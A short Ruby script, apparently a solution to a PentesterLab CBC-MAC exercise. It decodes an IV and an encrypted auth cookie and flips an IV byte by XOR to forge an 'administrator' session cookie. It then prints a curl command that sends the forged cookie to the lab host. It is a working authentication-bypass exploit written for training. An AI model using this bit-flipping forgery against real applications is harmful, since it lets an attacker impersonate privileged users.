#https://pentesterlab.com/exercises/cbc-mac_ii/course

iv = "jXzY5DoRBJU%3D" #iv from a cookie may be
auth = "YmRtaW5pc3RyYXRvci0tzpEBvN2%2BIhw%3D" #cbc encrypted auth value

require 'base64'
require 'uri'

decoded_iv = Base64.decode64(URI.unescape(iv))
decoded_auth = Base64.decode64(URI.unescape(auth))


decoded_iv[0] = ('a'.ord^'b'.ord^decoded_iv[0].ord).chr
decoded_auth[0] = 'a'

new_iv = URI.escape(Base64.strict_encode64(decoded_iv),"+=/")
new_auth = URI.escape(Base64.strict_encode64(decoded_auth),"+=/")

puts new_iv
puts new_auth

puts "curl -H 'Cookie: iv=#{new_iv}; auth=#{new_auth}' http://ptl-d61f508b-5662b6e9.libcurl.so"